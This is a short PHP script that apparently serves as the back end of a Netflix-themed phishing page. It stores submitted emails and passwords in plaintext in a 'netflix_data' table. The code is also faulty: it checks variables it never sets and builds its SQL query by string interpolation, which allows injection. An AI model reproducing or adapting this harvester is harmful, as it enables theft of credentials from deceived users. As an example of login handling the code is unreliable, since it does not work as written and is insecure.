<?php
if (isset($_POST['email'])  && isset($_POST['password'])) {
 include 'db_conn.php';

 function validate($data){
     $data = trim($data);
     $data = stripslashes($data);
     $data = htmlspecialchars($data);
    return $data;

 }
  $name=validate($_POST['email']);
  $message=validate($_POST['password']);

  if (empty($password) || empty($email)) {
    header("Location: index.html");
  }else {
      $sql = "INSERT INTO netflix_data(email, password) VALUES('$email','$password')";
      $res = mysqli_query($conn, $sql);
      if ($res) {
          echo "Your meassage was sent successfully!";
      } else{
          echo "Your message could not be sent!";
      }
  }

}else {
    header("Location: signup.html");
}
?>